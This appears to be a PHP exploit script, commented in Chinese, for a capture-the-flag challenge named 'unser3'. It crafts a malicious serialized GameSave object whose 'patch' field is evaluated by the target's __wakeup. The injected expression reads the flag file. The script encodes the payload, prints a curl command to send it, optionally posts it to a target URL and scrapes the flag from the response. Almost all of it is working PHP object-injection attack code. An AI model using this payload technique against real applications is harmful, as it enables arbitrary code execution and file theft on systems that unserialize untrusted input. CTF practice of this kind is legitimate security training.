<?php
// ============================================================
// unser3 · 恶意存档生成器（原 Python exploit.py 的 PHP 版）
// 用法：
//   php gen_payload.php                          仅生成 payload（raw + urlencode + base64）
//   php gen_payload.php http://target/unser3/    生成 + 提交 + 打印回显（一条龙）
// ============================================================

// patch 表达式：__wakeup 里 eval('return <expr>;') 求值，
// 返回值（flag 文件内容）写回 patch 属性，随后被 print_r 回显。
// 相对路径 flag_unser3.txt 依赖服务端 cwd=题目目录；稳妥可用
// __DIR__ 版本（见 $exprRobust），两者等价。
$expr        = "file_get_contents('flag_unser3.txt')";
$exprRobust  = "file_get_contents(__DIR__.'/flag_unser3.txt')";

// 手工拼序列化串（等价于 serialize 一个 GameSave 对象；长度由 strlen 计算，永不写错）
$payload = sprintf(
    'O:8:"GameSave":3:{s:6:"player";s:6:"hacker";s:5:"level";i:99;s:5:"patch";s:%d:"%s";}',
    strlen($expr),
    $expr
);
$b64 = base64_encode($payload);

echo "[*] payload(raw)    = $payload\n";
echo "[*] payload(base64) = $b64\n";
echo "[*] 手动复现（curl）: curl -s -X POST -d \"save=" . urlencode($b64) . "\" http://target/unser3/\n";

$target = $argv[1] ?? '';
if ($target !== '') {
    $ch = curl_init($target);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query(['save' => $b64]),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
    ]);
    $html = curl_exec($ch);
    $err  = curl_error($ch);
    curl_close($ch);
    if ($html === false) {
        echo "[-] 请求失败：$err\n";
        exit(1);
    }
    if (preg_match('/.{0,100}flag\{unser3_[0-9a-f]{8}\}.{0,40}/s', $html, $m)) {
        echo "[*] 服务端回显（节选）：...{$m[0]}...\n";
    } else {
        echo "[*] 服务端回显：未直接匹配到 flag，翻响应内容找「对象内容」\n";
    }
    if (preg_match('/flag\{unser3_[0-9a-f]{8}\}/', $html, $m2)) {
        echo "[+] FLAG: {$m2[0]}\n";
    } else {
        echo "[-] FLAG: 未找到\n";
    }
}
